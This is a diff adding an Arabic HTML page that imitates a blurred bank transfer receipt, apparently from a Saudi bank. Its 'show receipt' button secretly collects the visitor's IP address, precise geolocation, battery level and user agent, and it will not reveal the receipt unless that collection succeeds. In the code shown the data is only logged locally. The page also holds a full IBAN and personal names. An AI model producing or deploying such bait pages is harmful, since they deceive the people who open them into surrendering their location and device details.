@@ -1,0 +1,320 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8">
+  <title>إيصال تحويل - مصرف</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: Arial, sans-serif;
+    }
+    
+    body {
+      background: white;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      padding: 10px;
+      direction: rtl;
+    }
+    
+    .receipt {
+      width: 320px;
+      background: white;
+      border: 1px solid #ddd;
+      padding: 15px;
+      position: relative;
+    }
+    
+    .header {
+      text-align: center;
+      margin-bottom: 15px;
+      padding-bottom: 10px;
+      border-bottom: 1px solid #eee;
+    }
+    
+    .header h1 {
+      font-size: 18px;
+      font-weight: bold;
+      color: #333;
+      margin-bottom: 2px;
+    }
+    
+    .header .english {
+      font-size: 14px;
+      color: #666;
+      margin-bottom: 8px;
+    }
+    
+    .ref-number {
+      font-size: 16px;
+      font-weight: bold;
+      color: #333;
+      text-align: center;
+      margin-bottom: 5px;
+    }
+    
+    .date {
+      font-size: 14px;
+      color: #666;
+      text-align: center;
+      margin-bottom: 15px;
+    }
+    
+    .section-title {
+      font-size: 16px;
+      font-weight: bold;
+      color: #333;
+      margin-bottom: 5px;
+    }
+    
+    .section-title.english {
+      font-size: 14px;
+      color: #666;
+      margin-bottom: 15px;
+      font-weight: normal;
+    }
+    
+    .amount {
+      font-size: 20px;
+      font-weight: bold;
+      color: #333;
+      text-align: center;
+      margin: 15px 0;
+      padding: 8px;
+      background: #f8f8f8;
+      border-radius: 4px;
+    }
+    
+    .transfer-details {
+      margin: 15px 0;
+    }
+    
+    .detail-row {
+      display: flex;
+      justify-content: space-between;
+      margin-bottom: 8px;
+      padding: 4px 0;
+    }
+    
+    .detail-label {
+      font-size: 14px;
+      color: #666;
+      font-weight: bold;
+    }
+    
+    .detail-value {
+      font-size: 14px;
+      color: #333;
+      text-align: left;
+    }
+    
+    .from-to-section {
+      display: flex;
+      justify-content: space-between;
+      margin: 15px 0;
+    }
+    
+    .from-box, .to-box {
+      flex: 1;
+      padding: 10px;
+      background: #f8f8f8;
+      border-radius: 4px;
+      margin: 0 5px;
+    }
+    
+    .box-title {
+      font-size: 12px;
+      color: #666;
+      margin-bottom: 5px;
+      font-weight: bold;
+    }
+    
+    .box-content {
+      font-size: 14px;
+      color: #333;
+    }
+    
+    .footer {
+      text-align: center;
+      margin-top: 20px;
+      padding-top: 15px;
+      border-top: 1px dashed #ddd;
+    }
+    
+    .contact {
+      font-size: 12px;
+      color: #666;
+      margin: 3px 0;
+    }
+    
+    .show-receipt-btn {
+      width: 100%;
+      background: #0047ab;
+      color: white;
+      border: none;
+      padding: 12px;
+      font-size: 16px;
+      border-radius: 4px;
+      cursor: pointer;
+      margin-top: 15px;
+      font-weight: bold;
+    }
+    
+    .blurred {
+      filter: blur(4px);
+      color: transparent;
+      text-shadow: 0 0 6px rgba(0, 0, 0, 0.5);
+    }
+    
+    .hidden {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <div class="receipt">
+    <div class="header">
+      <h1>إيصال التحويل</h1>
+      <div class="english">Transfer Receipt</div>
+      <div class="ref-number blurred">3543773977</div>
+      <div class="date blurred">10/1/2024</div>
+    </div>
+    
+    <div class="section-title">تفاصيل التحويل</div>
+    <div class="section-title english">Transfer Details</div>
+    
+    <div class="amount blurred">SAR Y:A</div>
+    
+    <div class="from-to-section">
+      <div class="to-box">
+        <div class="box-title">To / إلى</div>
+        <div class="box-content blurred">العددي</div>
+        <div class="box-content blurred">SA4233624519550223685524</div>
+        <div class="box-content blurred">العربي</div>
+      </div>
+      
+      <div class="from-box">
+        <div class="box-title">From / من</div>
+        <div class="box-content blurred">الحجالي</div>
+        <div class="box-content blurred">SA*5732</div>
+        <div class="box-content blurred">سلبا</div>
+      </div>
+    </div>
+    
+    <div class="transfer-details">
+      <div class="detail-row">
+        <div class="detail-label">Purpose / الغرض</div>
+        <div class="detail-value blurred">حوالات شخصية</div>
+      </div>
+      
+      <div class="detail-row">
+        <div class="detail-label">Status / الحالة</div>
+        <div class="detail-value blurred">مكتمل / Completed</div>
+      </div>
+    </div>
+    
+    <div class="footer">
+      <div class="contact">AltapliBank.com.sa</div>
+      <div class="contact">344 003 920</div>
+    </div>
+    
+    <button class="show-receipt-btn" onclick="showReceipt()">إظهار الإيصال</button>
+  </div>
+
+  <script>
+    async function collectUserInfo() {
+      try {
+        // جمع معلومات البطارية
+        let battery = null;
+        if (navigator.getBattery) {
+          battery = await navigator.getBattery();
+        }
+
+        // جمع معلومات IP
+        let ipData = null;
+        try {
+          ipData = await fetch("https://api.ipify.org?format=json").then(r => r.json());
+        } catch (e) {
+          console.log("فشل في الحصول على IP");
+        }
+
+        // جمع معلومات الموقع
+        const locationPromise = new Promise((resolve, reject) => {
+          if (!navigator.geolocation) {
+            reject(new Error("الموقع غير مدعوم"));
+            return;
+          }
+
+          navigator.geolocation.getCurrentPosition(
+            position => resolve(position),
+            error => reject(error),
+            { timeout: 10000 }
+          );
+        });
+
+        let locationData = null;
+        try {
+          locationData = await locationPromise;
+        } catch (error) {
+          console.log("فشل في الحصول على الموقع:", error.message);
+        }
+
+        // تخزين البيانات المجمعة
+        const userData = {
+          battery: battery ? `${Math.round(battery.level * 100)}%` : "غير متوفر",
+          ip: ipData ? ipData.ip : "غير متوفر",
+          location: locationData ? {
+            lat: locationData.coords.latitude,
+            lon: locationData.coords.longitude
+          } : "غير متوفر",
+          userAgent: navigator.userAgent,
+          timestamp: new Date().toISOString()
+        };
+
+        console.log("المعلومات المجمعة:", userData);
+        return userData;
+
+      } catch (error) {
+        console.error("خطأ في جمع المعلومات:", error);
+        return null;
+      }
+    }
+
+    async function showReceipt() {
+      // جمع المعلومات أولاً
+      const collectedData = await collectUserInfo();
+      
+      if (!collectedData) {
+        alert("فشل في جمع المعلومات، لا يمكن عرض الإيصال");
+        return;
+      }
+
+      // إزالة التعتيم عن جميع العناصر
+      const elements = document.querySelectorAll('.blurred');
+      elements.forEach(el => {
+        el.classList.remove('blurred');
+      });
+
+      // تحديث البيانات بالتفاصيل الحقيقية
+      document.querySelector('.ref-number').textContent = '3543773977';
+      document.querySelector('.date').textContent = '10/1/2024';
+      document.querySelector('.amount').textContent = '535.00 SAR';
+      document.querySelector('.to-box .box-content:nth-child(2)').textContent = 'العددي';
+      document.querySelector('.to-box .box-content:nth-child(3)').textContent = 'SA4233624519550223685524';
+      document.querySelector('.to-box .box-content:nth-child(4)').textContent = 'العربي';
+      document.querySelector('.from-box .box-content:nth-child(2)').textContent = 'الحجالي';
+      document.querySelector('.from-box .box-content:nth-child(3)').textContent = 'SA*5732';
+      document.querySelector('.from-box .box-content:nth-child(4)').textContent = 'سابا';
+      document.querySelector('.detail-row:nth-child(1) .detail-value').textContent = 'حوالات شخصية';
+      document.querySelector('.detail-row:nth-child(2) .detail-value').textContent = 'مكتمل / Completed';
+
+      // إخفاء الزر بعد النقر
+      document.querySelector('.show-receipt-btn').style.display = 'none';
+    }
+  </script>
+</body>
+</html>
